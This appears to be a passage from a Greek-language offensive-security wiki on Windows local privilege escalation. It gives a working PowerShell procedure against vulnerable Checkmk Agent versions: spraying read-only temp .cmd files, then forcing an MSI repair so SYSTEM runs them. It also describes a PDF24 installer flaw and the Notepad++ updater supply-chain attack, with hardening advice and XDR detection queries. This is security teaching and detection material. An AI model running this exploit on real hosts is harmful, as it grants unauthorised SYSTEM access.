Ορισμένοι Windows agents εξακολουθούν να υλοποιούν privileged actions γράφοντας ένα προσωρινό `.cmd` στο `C:\Windows\Temp` και εκτελώντας το ως `SYSTEM`. Αν το όνομα αρχείου είναι προβλέψιμο και η service δεν δημιουργεί ξανά με ασφάλεια υπάρχοντα αρχεία, ένας χρήστης με χαμηλά προνόμια μπορεί να προδημιουργήσει το μελλοντικό temp file ως **read-only** και να κάνει την privileged process να εκτελέσει περιεχόμενο που ελέγχει ο attacker αντί για το δικό της script.

Παρατηρήθηκε σε ευάλωτες εκδόσεις του Checkmk Agent:
- μοτίβο temp: `cmk_all_<PID>_1.cmd`
- επηρεαζόμενοι κλάδοι: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: **repair** του cached agent package μέσω MSI<sup>[[8]](#references)[[9]](#references)</sup>

Πρακτική διαδικασία:
1. Εκτιμήστε ένα ρεαλιστικό εύρος PID βάσει των τρεχόντων process IDs ή του PID του agent που εκτελείται.
2. Γράψτε ένα σύντομο **ASCII** `.cmd` payload (`Set-Content -Encoding Ascii` ή ανακατεύθυνση εξόδου από `cmd.exe`· αποφύγετε έξοδο PowerShell σε UTF-16 για batch files).
3. Κάντε spray στα `C:\Windows\Temp\cmk_all_<PID>_1.cmd` για το υποψήφιο εύρος και ορίστε κάθε αρχείο ως read-only.
4. Κάντε trigger την επιδιόρθωση του cached MSI, ώστε η privileged service να επιχειρήσει να αναδημιουργήσει και, στη συνέχεια, να εκτελέσει το temp script.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Αν το ευάλωτο προϊόν έχει εγκατασταθεί με το Windows Installer, αντιστοιχίστε το MSI με την τυχαία ονομασία που βρίσκεται στην προσωρινή μνήμη στο `C:\Windows\Installer` με το όνομα του προϊόντος πριν ξεκινήσετε την επιδιόρθωση:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Operational notes:
- Το `qwinsta` είναι χρήσιμο όταν το `msiexec /fa` αποτυγχάνει από μη διαδραστικό WinRM shell και χρειάζεται να καταλάβετε αν μια υπάρχουσα συνεδρία επιφάνειας εργασίας/αποσυνδεδεμένη συνεδρία μπορεί να ενεργοποιήσει σωστά την επιδιόρθωση.<sup>[[7]](#references)</sup>
- Αυτό το μοτίβο γενικεύεται σε άλλους endpoint agents και updaters που **τοποθετούν temp scripts σε world-writable τοποθεσίες και αργότερα τα εκτελούν ως SYSTEM**. Ελέγξτε για προβλέψιμα ονόματα, έλλειψη σημασιολογίας exclusive create και ροές επιδιόρθωσης/ενημέρωσης που μπορούν να ενεργοποιηθούν κατ' απαίτηση.

### Επιδιόρθωση διαδραστικού installer και προνομιούχα κονσόλα

Το PDF24 Creator 11.15.1 αποτελεί παράδειγμα ξεχωριστού κινδύνου επιδιόρθωσης MSI: η custom action εγκατάστασης εκτυπωτή μπορεί να εκκινήσει ορατή κονσόλα με δικαιώματα SYSTEM κατά την επιδιόρθωση. Ο προμηθευτής τροποποίησε το MSI installer στην έκδοση 11.15.2 για να αντιμετωπίσει αυτή τη συμπεριφορά. Μια παλαιότερη έκδοση προϊόντος είναι απλώς ένδειξη για περαιτέρω έλεγχο. Ελέγξτε το καταχωρισμένο ή προσβάσιμο πακέτο MSI, αν αυτός ο χρήστης μπορεί να ξεκινήσει επιδιόρθωση, αν υπάρχουν η ευάλωτη custom action και η καθυστέρηση του log file, καθώς και αν μια διαδραστική επιφάνεια εργασίας μπορεί να εμφανίσει την κονσόλα. Η αναφερόμενη καθυστέρηση χρησιμοποιούσε oplock στο `faxPrnInst.log`· η συνήθης δυνατότητα εγγραφής στο αρχείο δεν είναι η μοναδική προϋπόθεση πρόσβασης. Ένα μη διαδραστικό shell, ένα μη προσβάσιμο πακέτο ή ένας patched installer μπορεί να διακόψει την αλυσίδα. Αυτό το ζήτημα δεν εξαρτάται από το `AlwaysInstallElevated` και διαφέρει από την αντικατάσταση ενός προβλέψιμου temporary script.

---
## Απομακρυσμένη παραβίαση supply chain μέσω ανεπαρκούς επικύρωσης updater (WinGUp / Notepad++)

Μεταξύ Ιουνίου 2025 και Δεκεμβρίου 2025, επιτιθέμενοι που παραβίασαν την υποδομή φιλοξενίας πίσω από τη ροή ενημερώσεων του Notepad++ παρείχαν επιλεκτικά κακόβουλα manifests σε επιλεγμένα θύματα. Οι παλαιότεροι updaters που βασίζονταν στο WinGUp δεν επαλήθευαν πλήρως τη γνησιότητα των ενημερώσεων, οπότε μια κακόβουλη απόκριση XML μπορούσε να ανακατευθύνει τους clients σε URL που έλεγχαν οι επιτιθέμενοι. Επειδή ο client αποδεχόταν περιεχόμενο HTTPS χωρίς να απαιτεί τόσο αξιόπιστη αλυσίδα πιστοποιητικών όσο και έγκυρη υπογραφή PE στο installer που κατέβαζε, τα θύματα κατέβαζαν και εκτελούσαν ένα trojanized NSIS `update.exe`.<sup>[[12]](#references)[[13]](#references)</sup>

Λειτουργική ροή (δεν απαιτείται τοπικό exploit):
1. **Παρεμβολή στην υποδομή**: παραβίαση CDN/φιλοξενίας και απόκριση στους ελέγχους ενημέρωσης με metadata των επιτιθέμενων που παραπέμπουν σε κακόβουλο URL λήψης.
2. **Trojanized NSIS**: ο installer κατεβάζει/εκτελεί ένα payload και καταχράται δύο αλυσίδες εκτέλεσης:
   - **Bring-your-own signed binary + sideload**: συμπερίληψη του υπογεγραμμένου `BluetoothService.exe` της Bitdefender και τοποθέτηση ενός κακόβουλου `log.dll` στη διαδρομή αναζήτησής του. Όταν εκτελείται το υπογεγραμμένο binary, τα Windows κάνουν sideload το `log.dll`, το οποίο αποκρυπτογραφεί και φορτώνει ανακλαστικά το Chrysalis backdoor (προστατευμένο με Warbird + API hashing για να δυσχεραίνεται η στατική ανίχνευση).
   - **Έγχυση shellcode μέσω script**: το NSIS εκτελεί ένα μεταγλωττισμένο Lua script που χρησιμοποιεί Win32 APIs (π.χ. `EnumWindowStationsW`) για να εισαγάγει shellcode και να προετοιμάσει το Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Μαθήματα για hardening/ανίχνευση σε κάθε auto-updater:
- Επιβάλετε **επαλήθευση πιστοποιητικού + υπογραφής** του installer που κατεβαίνει (καρφιτσώστε τον signer του προμηθευτή, απορρίψτε ασυμφωνίες CN/αλυσίδας) και υπογράψτε το update manifest (π.χ. XMLDSig). Αποκλείστε redirects που ελέγχονται από το manifest, εκτός αν έχουν επικυρωθεί.
- Αντιμετωπίστε το **BYO signed binary sideloading** ως pivot ανίχνευσης μετά τη λήψη: δημιουργήστε alert όταν ένα υπογεγραμμένο EXE προμηθευτή φορτώνει DLL με όνομα εκτός της κανονικής διαδρομής εγκατάστασής του (π.χ. η Bitdefender φορτώνει το `log.dll` από Temp/Downloads) και όταν ένας updater τοποθετεί/εκτελεί installers από temp με υπογραφές μη προερχόμενες από τον προμηθευτή.
- Παρακολουθήστε **artifacts ειδικά για malware** που παρατηρήθηκαν σε αυτή την αλυσίδα (χρήσιμα ως γενικά pivots): mutex `Global\Jdhfv_1.0.1`, ασυνήθιστες εγγραφές του `gup.exe` στο `%TEMP%` και στάδια έγχυσης shellcode μέσω Lua.
- Το Notepad++ αντέδρασε ενισχύοντας το WinGUp στην έκδοση v8.8.9 και στις νεότερες: το XML που επιστρέφεται είναι πλέον υπογεγραμμένο (XMLDSig), ενώ οι νεότερες εκδόσεις επιβάλλουν επαλήθευση πιστοποιητικού + υπογραφής του installer που κατεβαίνει, αντί να εμπιστεύονται μόνο τη μεταφορά.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideloading υπογεγραμμένου από Bitdefender EXE του <code>log.dll</code> (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> εκκινεί πρόγραμμα εγκατάστασης που δεν είναι του Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Αυτά τα μοτίβα ισχύουν για οποιοδήποτε updater δέχεται ανυπόγραφα manifests ή δεν επαληθεύει συγκεκριμένα τους υπογράφοντες των installers — network hijack + κακόβουλος installer + sideloading με BYO-signed αρχείο οδηγούν σε remote code execution υπό το πρόσχημα «έμπιστων» ενημερώσεων.

---
## References
- [1] [Ανακοίνωση ασφαλείας – Netskope Client για Windows – Τοπική κλιμάκωση προνομίων μέσω κακόβουλου διακομιστή (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Ανακοίνωση ασφαλείας Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – plugin του Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – IPC client/exploit του Netskope](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre και Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Τοπική κλιμάκωση προνομίων μέσω εγγράψιμων αρχείων στο Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Κλιμάκωση προνομίων στον agent των Windows](https://checkmk.com/werk/16361)
- [10] [PoCs του sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Κρατικοί παράγοντες εκμεταλλεύονται την εφοδιαστική αλυσίδα του Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – ενημέρωση για το περιστατικό παραβίασης της υποδομής](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Παράκαμψη της επιδιόρθωσης για το CVE-2025-0309 στο Netskope Client για Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Εντοπισμός σφαλμάτων κλιμάκωσης προνομίων στο Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
{{#include ../../banners/hacktricks-training.md}}
